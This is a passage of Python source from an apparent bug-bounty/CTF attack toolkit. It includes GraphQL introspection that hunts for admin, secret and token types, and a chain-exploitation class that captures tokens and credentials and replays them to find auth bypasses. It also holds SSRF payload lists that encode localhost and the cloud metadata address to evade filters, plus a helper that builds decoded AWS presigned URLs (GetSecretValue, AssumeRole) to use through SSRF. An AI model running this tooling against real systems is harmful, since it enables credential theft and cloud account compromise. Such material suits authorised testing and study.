        print("  [-] No schema in response")
        return {"introspection_enabled": False, "response": r.text[:500]}

    types = schema.get("types", [])
    queries = schema.get("queries", {}).get("name", "")
    mutations = schema.get("mutations", {}).get("name", "")
    subscriptions = schema.get("subscriptions", {}).get("name", "")

    print("  [+] Introspection enabled!")
    print(f"      Types: {len(types)}")
    print(f"      Query type: {queries}")
    print(f"      Mutation type: {mutations if mutations else 'none'}")
    print(f"      Subscription type: {subscriptions if subscriptions else 'none'}")

    interesting_types: list[dict[str, Any]] = []
    for t in types:
        type_name = t.get("name", "")
        kind = t.get("kind", "")
        fields = t.get("fields", [])

        if type_name.startswith("__"):
            continue

        if kind == "OBJECT" and fields:
            field_names = [f.get("name", "") for f in fields if f.get("name")]
            if any(
                kw in type_name.lower()
                for kw in ["user", "admin", "auth", "session", "config", "secret", "flag", "token"]
            ):
                interesting_types.append(
                    {
                        "type": type_name,
                        "fields": field_names,
                        "reason": "interesting name",
                    }
                )
                print(f"  [!] {type_name}: {field_names}")

    return {
        "introspection_enabled": True,
        "types": types,
        "query_type": queries,
        "mutation_type": mutations,
        "subscription_type": subscriptions,
        "interesting_types": interesting_types,
        "type_count": len(types),
    }


def graphql_field_dump(
    url: str,
    type_name: str,
    *,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Dump all fields and arguments for a specific GraphQL type."""
    scanner_obj = _get_scanner_xss(url, scanner)
    print(f"[*] GraphQL field dump for type '{type_name}' on {url}")

    query = FIELD_QUERY_TEMPLATE.format(type_name=type_name)
    r = scanner_obj._make_request(
        "POST",
        url,
        json={"query": query},
        headers={"Content-Type": "application/json"},
    )

    if r.status_code != 200:
        return {"error": f"HTTP {r.status_code}"}

    try:
        data = r.json()
    except (ValueError, json.JSONDecodeError):
        return {"error": "invalid JSON response"}

    type_info = data.get("data", {}).get("__type", {})
    if not type_info:
        return {"error": "type not found", "response": data}

    fields = type_info.get("fields", [])
    input_fields = type_info.get("inputFields", [])
    enum_values = type_info.get("enumValues", [])

    print(f"  Type: {type_info.get('name')} ({type_info.get('kind')})")
    if fields:
        print(f"  Fields ({len(fields)}):")
        for f in fields:
            fname = f.get("name", "?")
            ftype = f.get("type", {}).get("name", "?") or f.get("type", {}).get("ofType", {}).get(
                "name", "?"
            )
            args = [a.get("name", "?") for a in f.get("args", [])]
            print(f"    {fname}: {ftype}" + (f" (args: {args})" if args else ""))

    if input_fields:
        print(f"  Input fields ({len(input_fields)}):")
        for inp in input_fields:
            print(f"    {inp.get('name')}: {inp.get('type', {}).get('name', '?')}")

    if enum_values:
        print(f"  Enum values: {[e.get('name') for e in enum_values]}")

    return {
        "type": type_info,
        "fields": fields,
        "input_fields": input_fields,
        "enum_values": enum_values,
    }


# ============================================================================
# Chain Exploitation Helpers
# ============================================================================


class ChainContext:
    """Carries findings from one exploit to feed the next."""

    def __init__(self) -> None:
        self.tokens: dict[str, str] = {}
        self.cookies: dict[str, str] = {}
        self.credentials: list[dict[str, str]] = []
        self.endpoints: list[str] = []
        self.findings: list[dict[str, Any]] = []
        self.session = requests.Session()

    def add_token(self, name: str, token: str, source: str = "") -> None:
        self.tokens[name] = token
        self.findings.append({"type": "token", "name": name, "value": token[:50], "source": source})
        print(f"[+] Token captured: {name} (source: {source})")

    def add_credential(self, user: str, password: str, source: str = "") -> None:
        self.credentials.append({"user": user, "password": password, "source": source})
        self.findings.append({"type": "credential", "user": user, "source": source})
        print(f"[+] Credential captured: {user} (source: {source})")

    def add_finding(self, vuln_type: str, endpoint: str, details: str) -> None:
        self.findings.append(
            {
                "type": vuln_type,
                "endpoint": endpoint,
                "details": details,
                "timestamp": datetime.now().isoformat(),
            }
        )

    def try_endpoints_with_token(
        self, token_name: str, endpoints: list[str], base_url: str
    ) -> list[dict[str, Any]]:
        """Try a list of endpoints with a captured token to find auth bypasses."""
        if token_name not in self.tokens:
            print(f"[!] No token named {token_name}")
            return []
        token = self.tokens[token_name]
        results: list[dict[str, Any]] = []
        print(f"[*] Trying {len(endpoints)} endpoints with token {token_name}")
        for ep in endpoints:
            full_url = base_url.rstrip("/") + ep
            for header_format in [
                {"Authorization": f"Bearer {token}"},
                {"X-Auth-Token": token},
                {"Cookie": f"admin_token={token}"},
            ]:
                try:
                    r = self.session.get(full_url, headers=header_format, timeout=5)
                    if r.status_code == 200 and len(r.text) > 100:
                        header_used = next(iter(header_format.keys()))
                        print(f"[+] {ep} accepted with {header_used} → {r.status_code}")
                        results.append(
                            {
                                "endpoint": ep,
                                "header": header_format,
                                "status": r.status_code,
                                "length": len(r.text),
                            }
                        )
                        break
                except requests.exceptions.RequestException:
                    continue
        return results


# ============================================================================
# Reporting
# ============================================================================


SEVERITY_MAP: dict[str, str] = {
    "command_output": "CRITICAL",
    "file_contents": "HIGH",
    "xxe_triggered": "HIGH",
    "sql_error": "HIGH",
    "ssti_evaluated": "HIGH",
    "auth_bypass": "HIGH",
    "info_leak": "MEDIUM",
    "redirect": "LOW",
    "cookie_set": "INFO",
}

SEVERITY_ORDER: dict[str, int] = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}


def generate_report(
    scanner_or_findings: SecurityScanner | list[dict[str, Any]],
    target: str | None = None,
    format: str = "markdown",
) -> str:
    """Generate a structured report from scanner findings.

    Accepts either a SecurityScanner instance or a list of findings.
    """
    if hasattr(scanner_or_findings, "findings"):
        findings = scanner_or_findings.findings
        target = target or getattr(scanner_or_findings, "base_url", "unknown")
        history: list[dict[str, Any]] = getattr(scanner_or_findings, "test_history", [])
    elif isinstance(scanner_or_findings, list):
        findings = scanner_or_findings
        history = []
    else:
        findings = []
        history = []

    if format == "json":
        return json.dumps(
            {
                "target": target,
                "generated_at": datetime.now().isoformat(),
                "findings_count": len(findings),
                "findings": findings,
                "test_history": history,
            },
            indent=2,
            default=str,
        )

    lines: list[str] = [
        "# Security Assessment Report",
        "",
        f"**Target:** {target}",
        f"**Generated:** {datetime.now().isoformat()}",
        f"**Findings:** {len(findings)}",
        f"**Tests run:** {len(history)}",
        "",
    ]

    by_indicator: dict[str, list[dict[str, Any]]] = {}
    for f in findings:
        for ind in f.get("indicators", []) or [f.get("type", "unknown")]:
            by_indicator.setdefault(ind, []).append(f)

    if not findings:
        lines.extend(["## Summary", "", "No vulnerabilities detected."])
        return "\n".join(lines)

    lines.extend(
        [
            "## Summary",
            "",
            "| Indicator | Count |",
            "|:----------|:------|",
        ]
    )
    for ind, items in sorted(by_indicator.items(), key=lambda x: -len(x[1])):
        lines.append(f"| {ind} | {len(items)} |")
    lines.append("")

    lines.extend(["## Findings", ""])
    for i, f in enumerate(findings, 1):
        indicators = f.get("indicators", [])
        max_sev = "INFO"
        for ind in indicators:
            s = SEVERITY_MAP.get(ind, "INFO")
            if SEVERITY_ORDER.get(s, 0) > SEVERITY_ORDER.get(max_sev, 0):
                max_sev = s

        lines.extend(
            [
                f"### Finding #{i}: {max_sev} — {f.get('type', 'vulnerability')}",
                "",
                f"- **Endpoint:** `{f.get('endpoint', 'N/A')}`",
                f"- **Method:** {f.get('method', 'N/A')}",
                f"- **Payload:** `{f.get('payload', 'N/A')}`",
            ]
        )
        if indicators:
            lines.append(f"- **Indicators:** {', '.join(indicators)}")
        if f.get("details"):
            lines.append("- **Details:**")
            for d in f["details"]:
                lines.append(f"  - {d}")
        lines.append("")

    return "\n".join(lines)


def save_report(
    scanner_or_findings: SecurityScanner | list[dict[str, Any]],
    output_path: str | None = None,
    format: str = "markdown",
) -> str:
    """Save a report to disk and return the path."""
    if output_path is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        ext = "json" if format == "json" else "md"
        output_path = os.path.expanduser(f"~/.hermes/security_reports/report_{ts}.{ext}")

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    report = generate_report(scanner_or_findings, format=format)
    with open(output_path, "w") as f:
        f.write(report)
    print(f"[*] Report saved to {output_path}")
    return output_path


# ============================================================================
# SSRF Filter Bypass Detection
# ============================================================================


SSRF_PAYLOADS_LOCALHOST: list[dict[str, str]] = [
    {"name": "localhost", "url": "http://127.0.0.1", "bypasses": "none"},
    {"name": "octal", "url": "http://0177.0.0.1", "bypasses": "127.0.0.1_filter"},
    {"name": "decimal", "url": "http://2130706433", "bypasses": "127.0.0.1_filter"},
    {"name": "hex", "url": "http://0x7f000001", "bypasses": "127.0.0.1_filter"},
    {"name": "short", "url": "http://127.1", "bypasses": "127.0.0.1_filter"},
    {"name": "zero", "url": "http://0", "bypasses": "127.0.0.1_filter"},
    {"name": "all_zeros", "url": "http://0.0.0.0", "bypasses": "127.0.0.1_filter"},
]

SSRF_PAYLOADS_METADATA: list[dict[str, str]] = [
    {"name": "metadata_direct", "url": "http://169.254.169.254", "bypasses": "none"},
    {"name": "metadata_decimal", "url": "http://2852039166", "bypasses": "169.254_filter"},
    {"name": "metadata_octal", "url": "http://0251.0377.0251.0374", "bypasses": "169.254_filter"},
    {"name": "metadata_hex", "url": "http://0xa9fe0001", "bypasses": "169.254_filter"},
]


def detect_ssrf_filter(
    target_url: str,
    scanner: SecurityScanner,
    test_payloads: list[dict[str, str]] | None = None,
    *,
    ssrf_endpoint: str | None = None,
    ssrf_param: str | None = None,
    url_suffix: str = "",
) -> dict[str, Any]:
    """Detect SSRF URL-filter behavior and identify bypasses.

    Generic: the SSRF sink is discovered from the surface (or passed via
    ``ssrf_endpoint``/``ssrf_param``), and ``url_suffix`` is only used if the
    caller already found the target's filter needs one. Nothing target-specific
    is assumed.

    Returns blocked / working payload names, inferred blocked substrings, and
    working bypasses.
    """
    from bugbounty_ctf.engine import _resolve_ssrf_sink, _ssrf_blocked, _ssrf_fetch

    if test_payloads is None:
        test_payloads = SSRF_PAYLOADS_LOCALHOST + SSRF_PAYLOADS_METADATA

    result: dict[str, Any] = {
        "blocked": [],
        "working": [],
        "blocked_substrings": [],
        "bypasses": [],
    }

    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
    if not endpoint:
        result["error"] = "no SSRF sink discovered — pass ssrf_endpoint"
        return result

    for payload in test_payloads:
        r = _ssrf_fetch(scanner, endpoint, param, payload["url"], url_suffix=url_suffix)
        if _ssrf_blocked(r.text):
            result["blocked"].append(payload["name"])
        else:
            result["working"].append(payload["name"])
            if payload["bypasses"] != "none":
                result["bypasses"].append(payload["name"])

    # Probe which substrings the filter rejects (loopback host keeps this benign).
    for word in ["internal", "metadata", "localhost", "127.0.0.1"]:
        r = _ssrf_fetch(
            scanner, endpoint, param, f"http://127.0.0.1/?probe={word}", url_suffix=url_suffix
        )
        if _ssrf_blocked(r.text):
            result["blocked_substrings"].append(word)

    print(f"[*] SSRF filter: {len(result['blocked'])} blocked, {len(result['working'])} working")
    if result["bypasses"]:
        print(f"[!] Working bypasses: {', '.join(result['bypasses'])}")
    if result["blocked_substrings"]:
        print(f"[*] Blocked substrings: {', '.join(result['blocked_substrings'])}")

    return result


# ============================================================================
# AWS Presigned URL Helper
# ============================================================================


def generate_aws_presigned_url(
    service: str,
    action: str,
    access_key: str,
    secret_key: str,
    session_token: str,
    region: str = "us-east-1",
    endpoint_url: str = "",
    params: dict[str, str] | None = None,
) -> str:
    """Generate an AWS presigned URL for use via SSRF.

    Handles the %2F encoding issue by decoding the URL after generation.
    The signature is computed with %2F, but the URL uses / — servers
    that normalize URL encoding will accept both.

    Requires boto3 to be installed.
    """
    try:
        import boto3
    except ImportError as exc:
        raise ImportError("boto3 is required for AWS presigned URL generation") from exc

    client = boto3.client(
        service,
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=session_token,
        region_name=region,
        endpoint_url=endpoint_url,
    )

    method_map = {
        "GetCallerIdentity": "get_caller_identity",
        "GetSessionToken": "get_session_token",
        "AssumeRole": "assume_role",
        "ListQueues": "list_queues",
        "GetQueueUrl": "get_queue_url",
        "ReceiveMessage": "receive_message",
        "GetParameter": "get_parameter",
        "GetSecretValue": "get_secret_value",
        "ListBuckets": "list_buckets",
    }

    method_name = method_map.get(action, action.lower().replace("_", "_"))
    if not hasattr(client, method_name):
        method_name = action.lower()

    presigned_url = client.generate_presigned_url(
        method_name,
        Params=params or {},
        ExpiresIn=3600,
        HttpMethod="GET",
    )

    return urllib_parse_unquote(presigned_url)


def urllib_parse_unquote(url: str) -> str:
    """Unquote all percent-encoded characters in a URL.

    Some SSRF filters block ALL %XX patterns, not just %2F.
    This fully decodes the URL so no %XX patterns remain.
    """
    from urllib.parse import unquote

    return unquote(url)
